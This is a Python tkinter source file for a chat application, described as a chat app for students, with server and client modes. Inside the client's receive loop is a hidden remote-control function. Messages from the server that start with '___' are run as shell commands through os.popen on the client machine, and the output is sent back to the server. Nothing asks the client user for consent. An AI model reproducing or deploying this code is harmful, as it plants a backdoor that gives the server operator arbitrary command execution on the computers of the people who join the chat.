# /usr/bin/python3
import socket as socket
import tkinter as tk
import threading
import os
import sys
import time
from tkinter import ttk
from tkinter.simpledialog import *

# SERVER_Socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


class ChatApp:
    " Chat application for my students"

    BUFFERSIZE = 1024
    ADDR = None

    SERVER_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def show_config(obj):
        for key in obj.keys():
            print("[+]_  {} = {}".format(key, obj[key]))

    def __init__(self, master=None):
        self.master = master
        self.msg_to_send = tk.StringVar()
        self.ip_var = tk.StringVar()
        self.serverClient_var = tk.IntVar()
        self.clients = {}
        self.addresses = {}
        self.host = ""
        self.port = None
        #self.hostname = ""
        self.server_socket_obj = None

        self.welcome = ttk.Label(master=master, text="Welcome to Jugurth-Green Chat app", padding=15,
                                 font=("Arial", 30, "bold"), background="#202020", foreground="#00ff00")

        self.r1 = tk.Radiobutton(master, text=" Act as Server ", activebackground="#10ff55", cursor="hand1", variable=self.serverClient_var, value=1, command=self.start_new_MAIN_Thread, font=("Arial", 18, "bold"),
                                 foreground="#ff7700", background="#001020", relief="ridge", highlightbackground="#030", borderwidth=0,)

        self.r2 = tk.Radiobutton(master, text=" Act as Client ", activebackground="#10ff55", cursor="hand2", variable=self.serverClient_var, highlightbackground="#030", value=0, command=self.start_new_MAIN_Thread, font=("Arial", 18, "bold"),
                                 foreground="#ff7700", background="#001020", relief="ridge", borderwidth=0,)

        self.ip = tk.Entry(master=master, width=25, font=("Arial", 19, "bold"), textvariable=self.ip_var, highlightcolor="#00ff00", highlightbackground="#030", highlightthickness=1,
                           foreground="#00ffff", insertbackground="#0bf", insertborderwidth=3, background="#001020", relief="ridge", borderwidth=0, cursor="pencil")

        self.txt = tk.Listbox(master=master, cursor="double_arrow", background="#000", foreground="#00ff00", width=60, height=16, highlightbackground="#030", highlightcolor="#0ff",
                              relief="ridge", borderwidth=0, selectbackground="#333", selectforeground="#0ff", font=("monospaced", 15, "normal"))
        ChatApp.show_config(self.txt)

        self.inputt = tk.Entry(master=master, insertbackground="#0bf", insertborderwidth=3, width=40, font=("Arial", 19, "bold"), textvariable=self.msg_to_send, highlightthickness=1,
                               highlightcolor="#00ff00", foreground="#ffbb00", highlightbackground="#030", background="#001020", relief="ridge", borderwidth=0, )

        self.button = tk.Button(master=master, cursor="hand2", text=" Send ", font=("Arial", 19, "bold"), command=self.send_msg, highlightcolor="#005500",
                                foreground="#00ff00", background="#102010", highlightbackground="#030", relief="ridge", borderwidth=0, activebackground="#10ff55",)

        self.scrollbar = tk.Scrollbar(master=master, orient=tk.VERTICAL, command=self.txt.yview, activerelief="flat",
                                      activebackground="#10ff55", background="#004400", relief="flat",
                                      elementborderwidth=0, highlightbackground="#000", highlightcolor="#0f0",
                                      highlightthickness=0, troughcolor="#202020", width=25)

        #tk.Font(root=master, font=("Arial", 19, "bold"), name="jugu", exists=False)

        self.welcome.grid(row=0, column=0, columnspan=3)
        self.r1.grid(row=1, column=2, sticky="w")
        self.r2.grid(row=1, column=1, sticky="e")
        self.ip.grid(row=1, column=0, sticky="ewns")
        self.txt.grid(row=2, column=0, columnspan=3, sticky="news")
        self.inputt.grid(row=3, column=0, sticky="w")
        self.button.grid(row=3, column=2, sticky="ew")
        self.scrollbar.grid(row=2, column=2, sticky="nse")
        self.txt.config(yscrollcommand=self.scrollbar.set)
        self.button.focus()

        self.ip_var.set("0.0.0.0:55555")

        # self.master.mainloop()

    def send_msg(self, event=None):
        msg = self.msg_to_send.get()
        self.msg_to_send.set("")

        if self.serverClient_var.get():
            try:
                if msg[0:3] == "___":
                    self.txt.insert(tk.END, "[?] Execute : " + msg[3:])
                    # prefix="[!] Server command - {} - :  ".format( ChatApp.SERVER_Socket.getsockname())
                    self.broadcast(bytes(msg, "utf8"),)

                elif msg[0:3] == "***":
                    self.txt.insert(tk.END, " $ >>> " + msg[3:])
                    self.broadcast(bytes(msg[3:], "utf8"),)
                else:
                    self.broadcast(bytes(
                        msg, "utf8"), prefix="[!] Server - {} - :  ".format(ChatApp.SERVER_Socket.getsockname()))
                    self.txt.insert(tk.END, "[+] Sent :" + msg)

            except:
                print("********** Error accurred while sending message ! ***********")

        else:
            self.server_socket_obj.send(bytes(msg, "utf8"))

        if msg == "__quit__":
            self.server_socket_obj.close()
            self.master.quit()

    def start_new_MAIN_Thread(self):
        MAIN_THREAD = threading.Thread(group=None, target=self.func_Server_Client,
                                       name="*** Main Thread jugu ***", args=(), kwargs=None, daemon=None)
        MAIN_THREAD.start()
        # MAIN_THREAD.join()
        print("all threads has been exhausted !")
        #input("Press any Key to Stop the server socket.")
        # ChatApp.SERVER_Socket.close()

    def func_Server_Client(self):
        # print(self.ip_var)
        self.host, self.port = str(self.ip_var.get()).split(
            sep=":")  # .insert(0,":"
        print("Choosed : {}:{}".format(self.host, self.port))
        self.txt.insert(tk.END, "[!] Choosing Machine role...  ")

        if self.serverClient_var.get():
            self.txt.insert(
                tk.END, "********************************************|||||||||||||********************************************")
            self.txt.insert(
                tk.END, "********************************************| Server |********************************************")
            self.txt.insert(
                tk.END, "********************************************|||||||||||||********************************************")
            self.txt.insert(tk.END, " ")
            if self.host.strip() == "":
                self.host = socket.gethostname()
            #self.host = "0.0.0.0"
            self.txt.insert(tk.END, "[!] Choosed : \"Acting as server\"  ")
            self.txt.insert(
                tk.END, "[!] Requesting OS for Binding...  {}:{}".format(self.host, self.port))

            ChatApp.SERVER_Socket.bind((self.host, int(self.port)))
            self.txt.insert(
                tk.END, "[+] Succesffuly Binded:  {}:{}".format(self.host, self.port))
            ChatApp.SERVER_Socket.listen(10)
            self.txt.insert(
                tk.END, "Start listning on port :  {}".format(self.port))

            while True:
                self.txt.insert(
                    tk.END, "[!] Waiting for incomming connections...")
                client_socket_obj, client_address = ChatApp.SERVER_Socket.accept()
                self.txt.insert(
                    tk.END, "[+] {} has been connected  !".format(client_address))
                client_socket_obj.send(bytes(
                    "Server [{}:{}] >>> Welcome to ChatApp.  Please enter your Username.".format(self.host, self.port), "utf8"))

                self.addresses[str(client_socket_obj)
                               ] = client_address  # for future use
                # print(self.addresses)
                # print(self.clients)

                threading.Thread(name=client_address[1:-1], target=self.handle_client,
                                 args=(client_socket_obj,)).start()

        else:
            self.txt.insert(
                tk.END, "********************************************|||||||||||||********************************************")
            self.txt.insert(
                tk.END, "********************************************| Client  |********************************************")
            self.txt.insert(
                tk.END, "********************************************|||||||||||||********************************************")
            self.txt.insert(tk.END, " ")
            ChatApp.SERVER_Socket.connect((self.host, int(self.port)))
            self.server_socket_obj = ChatApp.SERVER_Socket
            print("Server socket Object has been created for the You.")
            receiving_thread = threading.Thread(target=self.receiving)
            receiving_thread.start()

    def broadcast(self, msg, prefix=""):
        for sock in self.clients:
            sock.send(bytes(prefix, "utf8") + msg)

    def receiving(self):

        self.msg_to_send.set("Enter your Username : ")
        while True:
            try:
                msg = self.server_socket_obj.recv(
                    ChatApp.BUFFERSIZE).decode("utf8")

                if msg[0:3] == "___":
                    self.txt.insert(tk.END, " command: " + msg[3:])
                    threading.Thread(
                        target=self.cmd, name="MSdos", args=(msg[3:],)).start()
                else:
                    self.txt.insert(tk.END, " - " + msg)
            except OSError:  # Possibly client has left the chat.
                break

    # show_config(txt)
    def handle_client(self, client_socket_obj):
        print("Addresses: " + str(self.addresses))
        print("Clients: " + str(self.clients))
        client_name = client_socket_obj.recv(
            ChatApp.BUFFERSIZE).decode("utf8")[21:]
        self.txt.insert(tk.END, client_name + " > has been connected !")
        welcome = "[+] Server Response : Welcome Mr ***| {} |***,     [-] Send \"__quit__\" to let the Group.".format(
            client_name)
        client_socket_obj.send(bytes(welcome, "utf8"))

        broadcast_msg = "[!]-{}- {} has joined the Chat Group".format(
            client_socket_obj.getsockname(), client_name)
        self.broadcast(bytes(broadcast_msg, "utf8"))
        self.clients[client_socket_obj] = client_name
        #client_socket_obj.send(bytes("*"*100, "utf8"))
        while True:
            msg = client_socket_obj.recv(ChatApp.BUFFERSIZE)

            if msg[0:4] == ">>> ":
                self.txt.insert(tk.END, msg.decode("utf8"))

            elif msg != bytes("__quit__", "utf8"):
                self.broadcast(
                    msg, "[+]--|" + str(client_socket_obj.getpeername()) + "|--(" + client_name + ") : ")
                self.txt.insert(tk.END, "[+] Broadcast from {}  : ".format(
                    client_socket_obj.getpeername()) + msg.decode("utf8"))
                #print("Message \" {} \" sent to all clients !".format(msg))

            else:
                client_socket_obj.send(bytes("__quit__", "utf8"))
                client_socket_obj.close()

                del self.clients[client_socket_obj]
                if len(self.clients) == 1:  # supposed to be 0

                    if askyesno(title="Do you want to quit?", message="Do you want to quit ChatApp?"):
                        ChatApp.SERVER_Socket.shutdown(socket.SHUT_RDWR)
                        ChatApp.SERVER_Socket.close()
                        sys.exit(0)
                        break
                    continue

                broadcast_msg_left = "[!] {} has left the Chat Group".format(
                    client_name)
                self.txt.insert(
                    tk.END, "[!] Notice : {} has left the Chat Group: ".format(client_name))
                self.broadcast(bytes(broadcast_msg_left, "utf8"))
                break

    def cmd(self, command):
        print("command = ", command)
        exe = str(os.popen(command).read()).split(sep="\n")
        print("exe= " + str(exe))

        for line in exe:
            self.server_socket_obj.send(bytes(">>> " + line, "utf8"))
            time.sleep(0.01)

        print("Command executed.")


def main():
    root = tk.Tk()
    root.title(string="--- Chat App ---")
    root.geometry(newGeometry="1020x600")
    root.config(background="#202020", padx=20, pady=20)
    root.resizable(width=False, height=False)
    # MAIN_THREAD = threading.Thread(group=None, target=ChatApp, name="*** Main Thread ***", args=(root,), kwargs=None, daemon=None)
    # MAIN_THREAD.start()
    obj = ChatApp(root)
    root.bind(sequence="<Return>", func=obj.send_msg, add=None)
    root.mainloop()


if __name__ == '__main__':
    main()
